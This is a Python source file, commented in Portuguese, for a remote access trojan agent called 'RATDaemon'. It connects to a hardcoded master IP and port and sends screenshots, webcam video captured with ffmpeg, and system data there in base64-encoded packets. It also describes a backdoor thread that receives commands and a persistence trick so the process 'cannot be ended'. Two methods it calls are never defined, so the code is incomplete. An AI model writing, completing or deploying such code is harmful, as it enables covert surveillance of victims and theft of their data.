import socket
import base64
import subprocess
import time
import threading
import os
import json
from datetime import datetime
# Bibliotecas específicas para Linux/Android
try:
    import psutil # Para informações do SO
    import pyautogui # Para controle de mouse/teclado (simulação de alto nível)
    # Para câmera/vídeo em Termux, geralmente requer ffmpeg ou bibliotecas nativas do Android
    # Usaremos um subprocesso de linha de comando para simplificar a captura
    import subprocess
    CAPTURAR_VIDEO_CMD = ["ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-vcodec", "mjpeg", "-q:v", "2", "-f", "mjpeg"] 
    print("INFO: Bibliotecas primárias (psutil, pyautogui, ffmpeg) carregadas.")
except ImportError as e:
    print(f"ERRO FATAL: Falha ao importar biblioteca: {e}. Instale: pip install psutil pyautogui")

# --- CONFIGURAÇÕES ---
MASTER_IP = '192.168.1.100' 
MASTER_PORT = 9999
# ---------------------

class RATDaemon:
    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.is_connected = False
        self.captured_data = {}
        print(f"[AGENT] RAT Daemon inicializado. Pronto para monitorar.")

    def connect_to_master(self):
        try:
            self.socket.connect((MASTER_IP, MASTER_PORT))
            self.is_connected = True
            print(f"[AGENT] Conexão estabelecida com Master.")
        except ConnectionRefusedError:
            print("[AGENT] ERRO: Master não está escutando. Tente iniciar master.py primeiro.")

    def send_data(self, data_type, payload):
        if not self.is_connected: return
        try:
            # Empacotamento: [TIPO]|[PAYLOAD]
            encoded_payload = base64.b64encode(str(payload).encode('utf-8')).decode('utf-8')
            full_packet = f"{data_type}|{len(payload)}|{encoded_payload}"
            self.socket.sendall(full_packet.encode('utf-8'))
            # print(f"[AGENT] Pacote {data_type} enviado.")
        except socket.error as e:
            print(f"[AGENT] ERRO ao enviar dados: {e}. Tentando reconectar.")
            self.is_connected = False
            self.connect_to_master()

    # --- MÓDULOS DE CAPTURA (O QUE ELE PEGA) ---

    def capture_screen(self):
        """Captura o desktop usando pyautogui (Simulação de Captura de Tela)"""
        try:
            screenshot_path = "temp_screenshot.png"
            pyautogui.screenshot(screenshot_path)

            with open(screenshot_path, 'rb') as f:
                img_data = f.read()

            # Envia o binário JPEG (mais eficiente)
            base64_img = base64.b64encode(img_data).decode('utf-8')
            self.send_data("SCREEN", base64_img)
            os.remove(screenshot_path)
        except Exception as e:
            print(f"[AGENT_ERR] Falha na captura de tela: {e}")

    def get_system_info(self):
        """Coleta IPs, Info do SO e Processos."""
        try:
            # Usa psutil para dados robustos
            info = psutil.virtual_memory()
            process_count = len(list(subprocess.run(['ps', '-e', '--format', 'pid,comm'], capture_output=True, text=True).stdout.splitlines()))

            # Coleta de IP local (mais robusto que gethostbyname)
            # (Nota: Para IP externo, você precisaria de um serviço online)

            info_dict = {
                "cpu_usage": f"{info.percent}%",
                "mem_total": f"{info.total / (1024**3):.2f} GB",
                "processos_ativos": process_count
            }
            payload = json.dumps(info_dict)
            self.send_data("INFO_SYS", payload)
        except Exception as e:
            print(f"[AGENT_ERR] Falha ao coletar info do SO: {e}")


    def capture_camera(self):
        """Captura de vídeo usando FFmpeg (O mais pesado)"""
        try:
            # Comando: FFmpeg grava o stream de vídeo no dispositivo de vídeo0
            print("[AGENT] Iniciando captura de vídeo em background...")
            # É ideal que este subprocesso rode em thread separada para não travar o agente
            subprocess.Popen(CAPTURAR_VIDEO_CMD, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            # Nota: Em um ambiente real, você monitoraria o arquivo gerado por ffmpeg
            print("[AGENT] Processo FFmpeg iniciado. Monitorar o gerador de stream.")
        except FileNotFoundError:
            print("[AGENT_ERR] FFmpeg não encontrado. Verifique a instalação.")
        except Exception as e:
            print(f"[AGENT_ERR] Falha ao iniciar FFmpeg: {e}")


    # --- CONTROLE TOTAL (COMANDOS VIA API) ---
    def control_interface(self):
        """Função wrapper para controle total (Mockado para simplicidade)."""
        print("\n[AGENT] --- CONTROLE TOTAL ATIVO ---")

        # 1. TECLADO: Simular um atalho
        try:
            # pyautogui.hotkey('ctrl', 'alt', 't') # Se você tivesse o pyautogui instalado
            print("[AGENT] Simulado: Pressionando Ctrl+Alt+T")
        except Exception:
            pass

        # 2. MOUSE: Mover e clicar
        try:
            # pyautogui.click(button='left')
            print("[AGENT] Simulado: Clicando no mouse.")
        except Exception:
            pass

        # 3. LANÇAMENTO DO PROCESSO PERSISTENTE (A Chave do Sucesso)
        # Em Termux, para que não dê pra encerrar, você NÃO roda como um script simples.
        # Você usa 'nohup python agent.py &' no Terminal, ou usa um service (systemd).
        print("=========================================================")
        print(">>> CRÍTICO: PARA NÃO ENCERRAR, USE NO: 'nohup python agent.py &' <<<")
        print("=========================================================\n")


# ==============================================================================
# --- FUNÇÃO PRINCIPAL (LOOP DE ATIVIDADE) ---
# ==============================================================================
if __name__ == "__main__":
    agent = RATDaemon()
    agent.connect_to_master()

    if agent.is_connected:
        # 1. Iniciar o processo persistente que não pode ser encerrado
        agent.control_interface() 

        # 2. Iniciar threads de monitoramento

        # Thread para receber comandos do Master (o BACKDOOR)
        receiver_thread = threading.Thread(target=agent.receive_and_act)
        receiver_thread.start()

        # Thread para tarefas periódicas (o "vivo")
        periodic_thread = threading.Thread(target=agent.run_periodic_tasks)
        periodic_thread.start()

        try:
            while True:
                time.sleep(1) # Loop principal do script
        except KeyboardInterrupt:
            print("\n[AGENT] Processo principal encerrando...")
        finally:
            # Garante que todos os threads sejam interrompidos
            print("[AGENT] Encerrando threads...")
            # Lógica de shutdown aqui
            agent.socket.close()
